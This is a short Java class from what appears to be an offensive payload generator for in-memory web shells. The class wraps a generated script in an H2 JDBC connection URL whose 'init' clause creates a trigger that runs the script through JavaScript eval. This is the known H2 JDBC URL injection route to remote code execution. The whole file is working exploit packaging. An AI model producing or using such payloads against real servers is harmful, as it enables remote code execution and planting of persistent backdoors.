package org.leo.jmg.mem.packer.h2;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.PackerRegistry;

import java.net.URLEncoder;

@PackerMeta(name = "H2JSURLEncode", group = "H2", order = 3)
public class H2JSURLEncodePacker implements Packer {
    String template = "jdbc:h2:mem:a;init=CREATE TRIGGER a BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\neval(decodeURIComponent('{{script}}'))$$";

    @Override
    public String pack(ClassPackerConfig config) throws Exception {
        String script = PackerRegistry.getOrThrow("DefaultScriptEngine").pack(config);
        String encode = URLEncoder.encode(script, "UTF-8")
                .replace("+", "%20")
                .replace("%28", "(")
                .replace("%29", ")");
        return template.replace("{{script}}", encode);
    }
}
